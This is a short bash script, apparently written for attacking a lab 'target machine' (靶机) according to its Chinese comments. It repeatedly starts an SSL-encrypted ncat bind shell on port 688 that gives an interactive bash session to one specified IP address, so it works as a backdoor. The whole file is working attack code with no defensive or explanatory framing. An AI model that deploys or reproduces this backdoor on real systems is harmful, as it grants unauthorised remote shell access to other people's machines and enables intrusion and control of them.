#!/bin/bash
echo "开始启动远程连接脚本"
our_ip="172.20.10.12"
our_port=688
count=0
for((i=0;i<5;i++));do       
let count++
echo "第"+$count+"次请求连接" 
#后台执行交出bash的远程加密连接命令
{ 
ncat -c bash --allow $our_ip -vnl $our_port --ssl 
}&
wait $! #等待后台执行结束再往下执行
echo "第"+$count+"次断开连接"
done
#当靶机的运行内存打满会执行到这里
echo "远程连接脚本执行抛出异常"
